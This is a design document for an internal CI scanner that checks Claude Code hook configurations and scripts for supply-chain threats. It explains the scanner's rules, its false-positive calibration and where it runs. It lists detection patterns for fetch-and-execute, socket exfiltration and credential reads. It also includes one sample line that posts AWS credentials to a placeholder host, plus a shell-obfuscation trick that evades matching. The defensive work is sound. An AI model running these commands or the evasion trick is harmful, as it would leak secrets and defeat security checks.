# Hook-content scan (W2.2) — design

Tool: `tooling/ci/agent-config-scan/check-agent-config.mjs` (+ `check-agent-config.test.mjs`,
`hops-job.yml`, `hops-mcp-job.yml`, `fixtures/real-hooks/`).
Evidence: `artifacts/agent-config-surface-sweep.md`.

`fixtures/real-hooks/` is the negative control — verbatim copies of hops' hook wiring and scripts,
asserted at zero blocking findings. `fixtures/clean|malicious|none` are runnable demo repos
(`--repo fixtures/malicious`); the test suite itself builds its own fixtures in temp directories so
the file can ship into a target repo unchanged.

## Why it exists

The AWOS `ai-security` audit's **AIS-03** includes "hook scripts contain no exfiltration /
download-and-execute patterns". On `hops` it is recorded as *skipped*: "no `.claude/hooks/` directory
found." `hops`' hooks live in `scripts/claude-hooks/`, wired from `.claude/settings.json`. The check
that most directly covers the AI-supply-chain surface has never read a hook in the most-hardened repo
in the org, and `ai-security`'s reported 100% is overstated by that check.

The fix upstream is a bug report (W3.4). The fix here is a scanner that does not make a path
assumption of its own — which is the single design constraint everything below follows from.

## What it reads, and in what order

1. `.claude/settings.json` and `.claude/settings.local.json`.
2. Every `hooks.<event>[].hooks[].command`, **scanned as content**. Four of the six registered hooks
   in this org exist only as inline shell strings; inline hook shell is code that no linter parses
   and no reviewer sees as code in a diff.
3. Any repo file a command references, resolved by trying each path-shaped token and keeping the ones
   that are real files. Dependency and VCS directories (`node_modules`, `.git`, `dist`, `build`,
   `vendor`, `target`, `.venv`) are excluded — a hook invoking `./node_modules/.bin/tsc` is inline
   shell, not a hook script — and a path resolving outside the repo is skipped, since that is a
   finding for a human rather than a file to read.
4. Every file in a **hooks directory**, meaning `.claude/hooks/` or a directory whose basename ends
   in `hook`/`hooks` that a command actually pointed at. This catches an unregistered script sitting
   next to a registered one. It deliberately does *not* walk the parent of every referenced file:
   `hops`' second hook points at `scripts/pre-commit`, and walking `scripts/` swept in 11 unrelated
   files on the first run.
5. `permissions.allow` / `deny` / `ask` values, credential patterns only.
6. `enabledPlugins` × `extraKnownMarketplaces`, advisory only.

## Rules

Eight blocking, one advisory. Each carries its rationale inline in the source.

| Rule | Blocks on |
|---|---|
| `fetch-exec` | `curl`/`wget` piped to a shell, `bash <(curl …)`, `eval $(curl …)` |
| `refless-remote-exec` | `git+` source with no `@ref`, `npx -y`, `uvx …@latest\|canary\|main` |
| `exfil-http` | `curl`/`wget` carrying a request body to a remote URL, `-X POST` |
| `exfil-socket` | `nc`/`ncat` to host+port, `/dev/tcp/`, `ssh host cat` |
| `credential-read` | a read verb adjacent to `~/.aws`, `~/.ssh/id_*`, `.netrc`, `.env`, keychain, `gcloud auth print-access-token` |
| `obfuscated-exec` | `base64 -d \| sh`, `xxd -r -p \| sh` |
| `guard-tamper` | removing/truncating `.git/hooks`, `core.hooksPath`, deleting `block-secrets.sh`, command-position `SKIP_SECRETS=1`, `--no-verify` |
| `hardcoded-credential` | length-anchored AWS/GitHub/Slack/GitLab/OpenAI/GCP key formats, PEM headers, DSN with inline password |
| `unpinned-plugin-marketplace` *(advise)* | a marketplace source with no `ref`/`commit`/`tag`/`rev`/`version`/`sha` |

## The four calibration decisions

Each exists because the naive form fires on real, benign security code. Counts are measured — see
the evidence file.

1. **`credential-read` requires a verb next to the path.** Path-alone matches 18 lines of
   `block-secrets.sh`: a secret-guard must name every credential path in order to block it.
   `readlink` is deliberately not in the verb list, for the same reason.
2. **Value patterns are length-anchored.** Unanchored prefixes match 7 lines of `scripts/pre-commit`,
   which carries `AKIA[0-9A-Z]` and `ghp_[a-zA-Z0-9]` as its *detector list*. A scanner that flags
   another scanner's patterns is unusable.
3. **`guard-tamper` enumerates removal verbs and requires command position.** Any mention of
   `.git/hooks` matches the hook that legitimately *reinstalls* the guard
   (`cp scripts/pre-commit .git/hooks/pre-commit`); a bare `SKIP_SECRETS=1` matches the 4 places
   `pre-commit` prints its own escape hatch as help text.
4. **Whole-line comments are skipped.** They cannot execute, and `block-secrets.sh` documents the
   attacks it blocks — that was the one false positive that survived to the first live run. Only
   whole-line: stripping from the first `#` on a code line would blind the scanner to a payload after
   an in-string `#` (`curl "http://x/#" -d @~/.aws/credentials`), and that case is a test.

**The generalisable form: a security scanner's hardest false positives come from security code.**
Guards name what they block, scanners carry what they match, docs describe the attack. A team whose
gate flags its own guard stops reading the gate.

## Boundaries, stated so nobody closes the wrong item

- **`.mcp.json` belongs to W2.1**, not here. Two jobs reporting one finding is how one of them gets
  deleted. The same applies in reverse: the marketplace-pinning advisory here is a *different*
  surface from MCP images and GitHub Actions (W1.4), not a duplicate of them.
- **Skills, agents and command definitions are not scanned.** They document shell in prose; the same
  rules there are noise.
- **The marketplace rule never blocks.** Claude Code has no documented `ref` field for a marketplace
  source, so the finding may have no available remedy, and a gate whose finding cannot be fixed gets
  disabled rather than fixed. It is reported and counted. If a pinning mechanism turns out to exist,
  flip `UNPINNED_ADVISORY` and the rule becomes a gate with no other change.
- **This is content matching, not analysis.** Shell fragmentation defeats it —
  `f=$(printf '\x63url'); $f …` — exactly as it defeats `block-secrets.sh`, whose own header says so.
  It is one layer: a reviewer reading a diff is another, and CODEOWNERS routing that review (W1.3) is
  what makes the reviewer exist.

## Where it runs, and why not everywhere

Gate in `hops` and `hops-mcp` — the two repos with hook content. Read-only sweep for `barley` and
`sowinsights`.

The reason this did not go to all four the way Scorecard (W2.3) did is **distribution, not value**.
Scorecard is an upstream action pinned by SHA: four copies are four small YAML files calling someone
else's code. This scanner is ours, and four vendored copies in three repos we do not maintain will
drift. Making it one copy needs a mechanism — a cross-repo reusable workflow (couples three repos'
CI to `hops` and needs an org setting) or a published package. That decision is open; until it is
made, fewer copies is the cheaper mistake.

`barley`'s surface is real but *indirect* — 3 enabled plugins from an unpinned marketplace, 0 local
hooks — so the only finding a gate would report there today is the advisory one already in the sweep.
That goes to its owners as a recommendation. `sowinsights` has no `.claude/` at all.
